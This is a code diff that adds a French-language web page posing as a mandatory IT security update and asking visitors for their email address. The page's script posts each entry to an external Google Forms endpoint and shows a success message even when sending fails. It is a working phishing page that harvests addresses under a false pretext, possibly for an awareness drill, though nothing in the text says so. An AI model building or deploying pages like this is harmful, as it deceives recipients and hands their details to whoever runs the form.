@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Mise à jour de sécurité obligatoire</title>
+  <style>
+    body {
+      background-color: #f4f6f9;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    h1 {
+      color: #333;
+      font-size: 20px;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 5px;
+      color: #555;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .message {
+      margin-top: 20px;
+      color: green;
+      font-weight: bold;
+      display: none;
+    }
+
+    .logo {
+      width: 100px;
+    }
+
+    .logo2 {
+      display: block;
+      width: 100px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5VTkKenjtmCdwlte_6RGCW0AwN7AYrEqgYg&s" class="logo2">
+    <img src="https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-shield-with-a-check-mark-safe-and-protect-logo-on-white-png-image_1870454.jpg" alt="Logo IT" class="logo">
+    <h1>Mise à jour de sécurité obligatoire</h1>
+    <p>Pour continuer à utiliser les services informatiques, veuillez saisir votre email.</p>
+    
+    <form id="securityForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdzEhG4lIMpdHxnWj2j62zNntAYp3J9Y5tiyZtawFbidj7KHA/formResponse" method="POST">
+      <label for="username">Email :</label>
+      <input type="text" id="username" name="username" required>
+      <button type="submit">Envoyer</button>
+    </form>
+
+    <div id="loader" style="display:none;">Envoi en cours...</div>
+    <div class="message" id="confirmationMessage" style="display:none;">Merci, vos informations ont été transmises avec succès.</div>
+    
+  </div>
+
+  <script>
+    document.getElementById('securityForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      var username = document.getElementById('username').value;
+
+      document.getElementById('loader').style.display = 'block';
+      document.getElementById('confirmationMessage').style.display = 'none';
+      
+      var form = document.getElementById('securityForm');
+      
+      var formData = new FormData(form);
+      formData.append("entry.2012654607", username);
+      
+      fetch(form.action, {
+        method: "POST",
+        body: formData
+      })
+        .then(response => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('confirmationMessage').style.display = 'block'; // Affiche le message de succès
+      })
+      .catch(error => {
+        document.getElementById('loader').style.display = 'none';
+        document.getElementById('confirmationMessage').style.display = 'block'; // Affiche le message de succès
+      });
+    });
+  </script>
+</body>
+</html>
